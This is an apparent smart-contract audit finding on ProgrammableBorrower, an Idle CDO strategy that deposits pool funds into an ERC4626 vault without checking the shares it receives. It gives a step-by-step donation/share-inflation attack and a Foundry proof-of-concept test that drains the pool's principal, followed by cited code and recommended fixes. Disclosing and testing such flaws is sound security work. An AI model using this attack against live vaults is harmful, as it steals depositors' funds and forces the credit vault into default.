### Title
Unvalidated ERC4626 share minting lets a vault depositor drain programmable-borrower principal - (`contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower` deposits pool assets into a permissionless ERC4626 vault but never validates the shares returned by `vault.deposit`. If the vault prices shares directly from its raw asset balance, an ordinary vault user can first-deposit/donate to inflate the share price, cause the borrower's pool deposit to mint zero shares, then redeem their own share for both the donation and the pool principal.

### Finding Description
During `startEpoch`, `onStartEpoch` calls `_depositToVault` with the entire idle underlying balance. `_depositToVault` records the returned share count only in an event and does not compare it with `vault.previewDeposit`, enforce `shares > 0`, or verify that the post-deposit `convertToAssets(vault.balanceOf(address(this)))` still approximates the deposited principal. [1](#0-0) [2](#0-1) 

A concrete attack during the buffer phase is:

1. The attacker deposits `1` wei into the ERC4626 vault and receives `1` share.
2. The attacker donates `P` underlying directly to the vault, making `totalAssets() == P + 1` while total supply remains `1`.
3. The owner calls `IdleCDOEpochVariant.startEpoch`.
4. `onStartEpoch` deposits the pool's `P` underlying into the vault.
5. A raw-balance ERC4626 mints `P * 1 / (P + 1) = 0` shares to `ProgrammableBorrower`; the call succeeds because the code does not reject zero shares.
6. The attacker redeems their `1` share for `2P + 1` underlying.
7. `ProgrammableBorrower` has no vault shares and cannot satisfy the epoch recall. `onStopEpoch` treats a reported zero vault position as uncovered and allows the subsequent `transferFrom` failure to route into `_handleBorrowerDefault`. [3](#0-2) [4](#0-3) 

This requires an ERC4626 vault whose `totalAssets`/`convertToShares` uses raw underlying balance and whose deposit path does not itself revert on zero shares. Those are standard permissionless vault properties; no privileged Idle role or malicious borrower is needed.

### Impact Explanation
The attacker can permanently steal up to the full amount deposited into the vault at epoch start. With `P` deposited by the pool and a `P` wei donation, the attacker spends approximately `P + 1` wei and redeems `2P + 1` wei, for a net gain of approximately `P`. The credit vault is left without backing for its strategy tokens and defaults when principal is recalled. [5](#0-4) 

### Likelihood Explanation
Any depositor in the selected external ERC4626 vault can execute the setup while the credit vault is in its buffer phase. `initialize` only verifies that `vault.asset()` matches the CDO underlying and then grants unlimited approval; it does not require deposit whitelisting, a virtual-share protected implementation, or a minimum share-mint invariant. [6](#0-5) 

### Recommendation
Require an explicit minimum-share result for every vault deposit, preferably based on a quoted acceptable share amount rather than only `previewDeposit`. For example, pass a `minShares`/`minAssetsOut` parameter through the epoch-start configuration and revert when `shares < minShares`.

Additionally:

- Reject `shares == 0` whenever `_assetAmount != 0`.
- Verify post-deposit vault value covers the prior position plus the deposited principal within an explicit rounding bound.
- Prefer ERC4626 integrations with permissioned deposits, virtual assets/shares, or an already-established protected share base.
- Treat a deposit that materially changes `convertToAssets(vaultSharesBalance())` as an integration failure rather than accounting it as principal.

### Proof of Concept
The following Foundry-style test demonstrates the accounting flaw with a raw-balance ERC4626 vault on a fork or local fixture:

```solidity
function testVaultDepositInflationStealsEpochDeposit() external {
    uint256 poolDeposit = 1_000_000e18;
    address attacker = makeAddr("attacker");

    // Attacker seeds the vault with 1 share.
    underlying.mint(attacker, 1);
    vm.startPrank(attacker);
    underlying.approve(address(vault), 1);
    vault.deposit(1, attacker);

    // Attacker inflates price to poolDeposit + 1 assets/share.
    underlying.mint(attacker, poolDeposit);
    underlying.transfer(address(vault), poolDeposit);
    vm.stopPrank();

    // Honest epoch start deposits all borrower-adapter cash into the vault.
    underlying.mint(address(programmableBorrower), poolDeposit);
    vm.prank(idleCDO);
    programmableBorrower.onStartEpoch(0);

    assertEq(
        vault.balanceOf(address(programmableBorrower)),
        0,
        "pool deposit minted zero shares"
    );

    // Attacker redeems their single share for donation + pool principal.
    vm.prank(attacker);
    uint256 stolen = vault.redeem(1, attacker, attacker);

    assertEq(stolen, 2 * poolDeposit + 1);
    assertEq(programmableBorrower.vaultSharesBalance(), 0);
    assertEq(programmableBorrower.totalUnderlying(), 0);
}
```

The vulnerable sequence maps to `onStartEpoch -> _depositToVault -> vault.deposit`, where the returned `shares` value is emitted but never checked before the contract relies on the resulting vault position for solvency. [7](#0-6) [2](#0-1)

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L118-135)
```text
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L212-220)
```text
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-253)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L546-549)
```text
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L577-598)
```text
  function _handleBorrowerDefault(uint256 funds) internal {
    defaulted = true;
    // Do not reopen instant claims here. They remain disabled when funding is pending;
    // successful full funding is the only path that enables them before finalization.

    if (isProgrammableBorrower) {
      IProgrammableBorrower(_borrower()).onDefault();
    }

    // deposits should be already prevented
    if (!paused()) {
      _pause();
    }

    // stop the current epoch
    isEpochRunning = false;

    // prevent withdrawals requests
    allowAAWithdrawRequest = false;
    allowBBWithdrawRequest = false;

    emit BorrowerDefault(funds);
```
